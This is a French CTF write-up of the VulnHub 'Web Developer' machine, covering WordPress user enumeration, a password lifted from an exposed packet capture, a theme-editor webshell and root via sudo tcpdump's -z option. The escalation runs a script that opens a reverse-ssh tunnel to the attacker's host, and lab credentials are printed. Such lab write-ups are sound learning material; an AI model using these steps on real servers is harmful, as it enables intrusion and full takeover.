---
title: "Solution du CTF Web Developer de VulnHub"
tags: [CTF,VulnHub]
---

Le CTF [Web Developer](https://vulnhub.com/entry/web-developer-1,288/) était simple avec un cheminement qui se fait sans réelle surprise.

La VM dispose d'un port 80 sur lequel on trouve un Wordpress.

Quand on regarde le code source on voit que l'installation est plutôt *stock* avec aucune mention d'un plugin particulier.

`Nmap` avec l'option `--script vuln` est capable d'énumérer les utilisateurs du CMS :

```
Nmap scan report for 192.168.56.208
Host is up (0.00012s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-dombased-xss: Couldn't find any DOM based XSS.
| http-enum: 
|   /wp-login.php: Possible admin folder
|   /readme.html: Wordpress version: 2 
|   /: WordPress version: 4.9.8
|   /wp-includes/images/rss.png: Wordpress version 2.2 found.
|   /wp-includes/js/jquery/suggest.js: Wordpress version 2.5 found.
|   /wp-includes/images/blank.gif: Wordpress version 2.6 found.
|   /wp-includes/js/comment-reply.js: Wordpress version 2.7 found.
|   /wp-login.php: Wordpress login page.
|   /wp-admin/upgrade.php: Wordpress login page.
|_  /readme.html: Interesting, a readme.
| http-wordpress-users: 
| Username found: webdeveloper
```

`Nuclei` en est tout autant capable :

```
[CVE-2017-5487:usernames] [http] [medium] http://192.168.56.208/?rest_route=/wp/v2/users/ [webdeveloper]
```

J'ai commencé à brute forcer le compte à l'aide de `wpscan` puis j'ai décidé d'énumérer un peu le serveur web, car le login `webdeveloper` peut laisser supposer que quelques fichiers trainent par ci par là.

J'ai ainsi trouvé un dossier nommé `ipdata` qui listait son contenu. On trouvait dedans un fichier `analyze.cap` que j'ai aussitôt ouvert avec `Wireshark`.

Sans surprises on y voit des requêtes HTTP sur le Wordpress. Je scrolle à la recherche d'une requête `POST` et trouve ce que je cherchais :

```http
POST /wordpress/wp-login.php HTTP/1.1
Host: 192.168.1.176
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://192.168.1.176/wordpress/wp-login.php?redirect_to=http%3A%2F%2F192.168.1.176%2Fwordpress%2Fwp-admin%2F&reauth=1
Content-Type: application/x-www-form-urlencoded
Content-Length: 152
Cookie: wordpress_test_cookie=WP+Cookie+check
Connection: keep-alive
Upgrade-Insecure-Requests: 1

log=webdeveloper&pwd=Te5eQg%264sBS%21Yr%24%29wf%25%28DcAd&wp-submit=Log+In&redirect_to=http%3A%2F%2F192.168.1.176%2Fwordpress%2Fwp-admin%2F&testcookie=1
```

Une fois le pass url-décodé, le voici : `Te5eQg&4sBS!Yr$)wf%(DcAd`.

Je peux alors me connecter sur le wordpress via `/wp-admin` puis utiliser l'éditeur de thème pour placer un webshell PHP. Je n'entre pas dans les détails sur la manipulation, mais il faut parfois essayer plusieurs thèmes avant de tomber sur un qui a les bonnes permissions.

Une fois sur le système je récupère les identifiants pour la DB stockés dans `wp-config.php` :

```php
define('DB_NAME', 'wordpress');

/** MySQL database username */
define('DB_USER', 'webdeveloper');

/** MySQL database password */
define('DB_PASSWORD', 'MasterOfTheUniverse');
```

On s'en doute, le mot de passe permet de se connecter sur le compte Unix du même nom. L'utilisateur a une entrée `sudo` :

```console
webdeveloper@webdeveloper:/var/www/html$ sudo -l
[sudo] password for webdeveloper: 
Matching Defaults entries for webdeveloper on webdeveloper:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User webdeveloper may run the following commands on webdeveloper:
    (root) /usr/sbin/tcpdump
```

Il existe un [GTFObin pour tcpdump](https://gtfobins.github.io/gtfobins/tcpdump/) qui exploite l'option `-z` :

```
       -z postrotate-command
              Used  in conjunction with the -C or -G options, this will make tcpdump run " postrotate-command file " where file is the savefile being closed after each rotation. For example, specifying -z
              gzip or -z bzip2 will compress each savefile using gzip or bzip2.

              Note that tcpdump will run the command in parallel to the capture, using the lowest priority so that this doesn't disturb the capture process.

              And in case you would like to use a command that itself takes flags or different arguments, you can always write a shell script that will take the savefile name as the  only  argument,  make
              the flags & arguments arrangements and execute the command that you want.
```

J'ai d'abord mis un `reverse-ssh` en écoute sur ma machine :

```bash
reverse-sshx64 -l -p 9999 -v
```

Puis j'ai créé le script à passer à `tcpdump` :

```console
webdeveloper@webdeveloper:/tmp$ echo "/tmp/reverse-sshx64 -p 9999 192.168.56.1" > yolo
webdeveloper@webdeveloper:/tmp$ chmod +x yolo
webdeveloper@webdeveloper:/tmp$ sudo /usr/sbin/tcpdump -ln -i lo -w /dev/null -W 1 -G 1 -z /tmp/yolo
tcpdump: listening on lo, link-type EN10MB (Ethernet), capture size 262144 bytes
Maximum file limit reached: 1
1 packet captured
32 packets received by filter
0 packets dropped by kernel
```

J'obtiens alors une connexion sur `reverse-ssh` : un tunnel a été établi et je peux accéder au système via mon port 8888.

```
2023/05/18 10:22:37 Successful authentication with password from reverse@192.168.56.208:46320
2023/05/18 10:22:37 Attempt to bind at 127.0.0.1:8888 granted
2023/05/18 10:22:37 New connection from 192.168.56.208:46320: root on webdeveloper reachable via 127.0.0.1:8888
```

Et voilà :

```console
$ ssh -p 8888 127.0.0.1
devloop@127.0.0.1's password: 
root@webdeveloper:/tmp# id
uid=0(root) gid=0(root) groups=0(root)
root@webdeveloper:/tmp# cd /root
root@webdeveloper:/root# ls
flag.txt
root@webdeveloper:/root# cat flag.txt 
Congratulations here is youre flag:
cba045a5a4f26f1cd8d7be9a5c2b1b34f6c5d290
```
